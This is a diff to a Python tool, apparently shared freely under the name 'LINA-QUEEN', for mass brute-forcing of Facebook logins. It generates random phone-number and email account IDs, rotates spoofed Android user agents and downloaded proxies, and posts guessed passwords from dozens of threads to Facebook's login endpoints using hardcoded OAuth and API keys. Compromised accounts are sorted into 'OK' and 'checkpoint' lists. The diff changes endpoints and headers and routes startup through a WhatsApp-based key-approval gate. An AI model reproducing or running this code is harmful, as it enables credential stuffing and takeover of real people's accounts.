@@ -1,16 +1,22 @@
-try: 
-         import os,requests,json,time,re,random,sys,uuid,string,subprocess 
-         from string import * 
-         import bs4
-         from concurrent.futures import ThreadPoolExecutor as tred
-         from bs4 import BeautifulSoup as sop
-         from bs4 import BeautifulSoup
+
+
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+
+try:
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess
+	from string import *
+	import bs4
+	#import dz
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from bs4 import BeautifulSoup as sop
+	from bs4 import BeautifulSoup
 except ModuleNotFoundError: 
-         os.system(f'pip install requests futures==2 > /dev/null')    
-         os.system('python Random1.py')
+	print('\n Installing missing modules ...')
+	os.system('pip install requests bs4 futures==2 > /dev/null')
+	os.system('python Random.py')
+	
 #print('[•] Join Whatsap Group')
 #os.system('xdg-open https://chat.whatsapp.com/B8pdA0uNxH88NnC38CIgVP')
-fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 
 try:
 	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
@@ -49,21 +55,6 @@ for xd in range(10000):
 	l='Mobile Safari/537.36'
 	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
-for us in range(10000): 
-     aa='Mozilla/5.0 (Linux; Android 13;' 
-     b=random.choice(['7.0','8.1.0','9','10','11','12']) 
-     c=random.choice(['Redmi Note 10 Pro']) 
-     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
-     e=random.randrange(1, 999) 
-     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
-     g='AppleWebKit/537.36 (KHTML, like Gecko)' 
-     h=random.randrange(80,103) 
-     i='0' 
-     j=random.randrange(4200,4900) 
-     k=random.randrange(40,150) 
-     l='Chrome/107.0.0.0 Mobile Safari/537.36' 
-     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}' 
-     ugen.append(uaku2) 
 for agent in range(10000):
 	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 	b=random.choice(['6','7','8','9','10','11','12','13'])
@@ -157,7 +148,8 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
-
+        
+        
 def main_apv():
 
     imt="QUEEN=="
@@ -227,8 +219,16 @@ def main_apv():
         os.system('am start https://wa.me/+923269916436?text=' + tks)        
         
         
+                
         
         
+        
+        
+        
+        
+        
+        
+
 logo=("""\033[1;97m
       db      d888888b d8b   db  .d8b.  
       88        `88'   888o  88 d8' `8b 
@@ -240,7 +240,7 @@ logo=("""\033[1;97m
 [~] Author   : LINA-QUEEN 
 [~] Facebook : LINA KUMARI
 [~] Tool     : FREE
-[~] Version  : 1.1
+[~] Version  : 6.0
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -329,7 +329,7 @@ def menu():
 					pcp.append('y')
 				else:
 					pcp.append('n')
-				with tred(max_workers=40) as crack_submit:
+				with tred(max_workers=30) as crack_submit:
 					clear()
 					total_ids = str(len(fo))
 					print(' Total account ids : \033[1;32m'+total_ids+f' ')
@@ -396,7 +396,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=40) as LINA:	
+		with tred(max_workers=30) as LINA:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -480,7 +480,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=40) as LINA:
+		with tred(max_workers=30) as LINA:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -521,7 +521,7 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Random1.py')
+		os.system('python Random.py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
@@ -750,17 +750,24 @@ def api3(ids,names,passlist):
 "generate_machine_id": "1",
 "fb_api_req_friendly_name": "authenticate",}
                         headers={
-                                "Accept-Encoding": "gzip, deflate",
-"Accept": "*/*",
-"Connection": "keep-alive",
-"User-Agent": ua,
-"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"X-FB-Friendly-Name": "authenticate",
-"X-FB-Connection-Type": "unknown",
-"Content-Type": "application/x-www-form-urlencoded",
-"X-FB-HTTP-Engine": "Liger",
-"Content-Length": "329",}
-                        url = 'https://b-graph.facebook.com/auth/login'
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+                        url = 'https://m.facebook.com/login/?refsrc=deprecated&rtime=1690732822&subno_key=AaHuP6SRSTphvNZGHFS0XP3xPUXRLmsv7aWU8afQ0pbKLwJY77ASr_VkW7XEgrKbFrYYTKRE18i18menWvIdAaG1cb5sgfA4ZMNq4UfOWVEfQTPYK5wJdRc9zGsqVcm6z0QLD6-LhQKV3lhro7UOYGvtAjYuGEl6gdr5Lb17sbZQYkvOs7BfiDDxCGKlm5_6WvB53qfqPa8RRMG8XcodpXBpiRR95D6MlywnbXJC7M5JVcigZJyYzS43DjtTWtWX_Z9l5FOz1pXMotxCHolIDYonQ0ZewBkVFxWEOFLvY8Ek55O_l6lVrE6V0-2MA7qjdaE&hrc=1&wtsid=rdr_0FsbWwDqC7kfP6u6l&_rdr',
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -961,23 +968,24 @@ def api5(ids,names,passlist):
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d",}
                         headers={
-                                'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '25227',
-'X-FB-SIM-HNI': '29752',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': '706'}
-                        url = 'https://b-graph.facebook.com/auth/login'
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+                        url = 'https://mbasic.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -1673,7 +1681,7 @@ def lina6(ids,passlist):
 	except:
 		pass
 try:
-	menu()
+	main_apv()
 except requests.exceptions.ConnectionError:
 	print('\n No internet connection ...')
 	exit()
